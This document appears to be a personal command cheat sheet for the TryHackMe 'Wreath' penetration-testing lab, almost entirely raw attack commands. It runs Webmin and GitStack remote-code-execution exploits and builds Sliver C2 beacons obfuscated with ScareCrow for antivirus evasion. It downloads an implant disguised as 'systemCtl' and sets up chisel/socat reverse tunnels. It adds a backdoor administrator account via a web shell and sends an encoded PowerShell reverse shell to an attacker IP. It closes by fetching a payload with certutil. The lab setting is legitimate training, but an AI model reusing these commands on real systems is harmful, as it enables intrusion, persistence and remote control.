# Wreath CMD-by-CMDs

```bash
sed -i 's/10.50.76.121/10.50.76.121/g' *-CMD-by-CMDs.md
```

```bash
echo "10.200.X.200 thomaswreath.thm thomaswreath.thm.evil.com" | sudo tee -a /etc/hosts

# CVE 
cd CVE-2019-15107 
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
python3 CVE-2019-15107.py

# Sliver
generate beacon --http 10.50.76.121:2222 --arch amd64 --os linux --save /home/kali/Wreath/
http -L 10.50.76.121 -l 2222

generate beacon --http 10.200.96.200:10005 --arch amd64 --os windows --save /home/kali/Wreath/GIT-SERV-S.bin -f shellcode -G

/opt/ScareCrow/ScareCrow -I /home/kali/Wreath/GIT-SERV-S.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"


http -L 10.50.76.121 -l 10005

10.50.76.121 
8888



curl http://10.50.76.121/chisel -o chisel
curl http://10.50.76.121/SILVER -o systemCtl
curl http://10.50.76.121/socatx64.bin -o socat
curl http://10.50.76.121/Excel.exe -o Excel.exe

nohup ./systemCtl &
./chisel server -host 10.50.76.121 --reverse --socks5 -p 10000
nohup ./chisel client 10.50.76.121:10000 R:10001:socks &
# modify /etc/proxychains4.conf socks5 127.0.0.1 10001

# Reverse Port forward for gitstack exploit
nohup ./chisel client 10.50.76.121:10000 R:127.0.0.1:10002:10.200.84.150:80 &
# For git-serv reverse shell
nohup ./chisel client 10.50.76.121:10000 R:10003:socks &
# For silver beacon
nohup ./chisel client 10.50.76.121:10000 R:10004:127.0.0.1::socks &

firewall-cmd --zone=public --add-port $PORT/tcp

python2 gitstackRCE.py

# Do what you are told..
curl http://127.0.0.1:10002/web/exploit-nvm.php -d 'a=net+user+nvm+nvmNVM69!+/add'
curl http://127.0.0.1:10002/web/exploit-nvm.php -d 'a=net+localgroup+Administrators+nvm+/add'
curl http://127.0.0.1:10002/web/exploit-nvm.php -d 'a=net+localgroup+"Remote+Management+Users"+nvm+/add'


# Setup socat for relay with chisel coloured tears..
nohup ./socat tcp-l:10004 tcp:10.50.76.121:10004 &

# Bypass url encoding issues
iconv -f ASCII -t UTF-16LE rPwsh-gitserv.txt | base64 | tr -d "\n"


curl http://127.0.0.1:10002/web/exploit-nvm.php -d 'a=powershell.exe+-EncodedCommand+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMgAwADAALgA5ADYALgAyADAAMAAnACwAMQAwADAAMAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA'

nohup ./socat tcp-l:10005 tcp:10.50.76.121:10005 &
nohup ./socat tcp-l:10006 tcp:10.50.76.121:10006 &

nohup python3 -m http.server 8443 &

certutil.exe -urlcache -f -split http://10.200.96.200:8443/Excel.exe -o Excel.exe


```


